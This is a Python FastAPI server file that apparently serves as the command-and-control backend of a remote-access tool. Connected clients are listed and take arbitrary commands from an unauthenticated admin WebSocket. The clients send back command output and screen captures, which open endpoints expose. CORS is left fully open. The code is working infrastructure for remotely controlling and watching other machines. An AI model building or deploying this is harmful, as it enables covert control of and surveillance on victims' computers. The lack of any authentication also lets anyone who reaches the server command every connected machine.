from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import base64
import os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
outputs = {}
screens = {}
admin_ws = None

@app.get("/clients")
async def list_clients():
    return {"clients": list(clients.keys())}

@app.get("/outputs/{client_id}")
async def get_output(client_id: str):
    return {"output": outputs.get(client_id, "")}

@app.get("/screen/{client_id}")
async def get_screen(client_id: str):
    return {"screen": screens.get(client_id, "")}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    try:
        while True:
            data = await websocket.receive()
            if "text" in data:
                outputs[client_id] = data["text"]
                if admin_ws:
                    await admin_ws.send_text(f"[{client_id}] {data['text']}")
            elif "bytes" in data:
                b64_image = base64.b64encode(data["bytes"]).decode()
                screens[client_id] = b64_image
                if admin_ws:
                    await admin_ws.send_text(f"__screen__{client_id}")
    except WebSocketDisconnect:
        clients.pop(client_id, None)
        outputs.pop(client_id, None)
        screens.pop(client_id, None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    global admin_ws
    await websocket.accept()
    admin_ws = websocket
    try:
        while True:
            msg = await websocket.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                await clients[target].send_text(cmd)
    except WebSocketDisconnect:
        admin_ws = None

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content, status_code=200)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
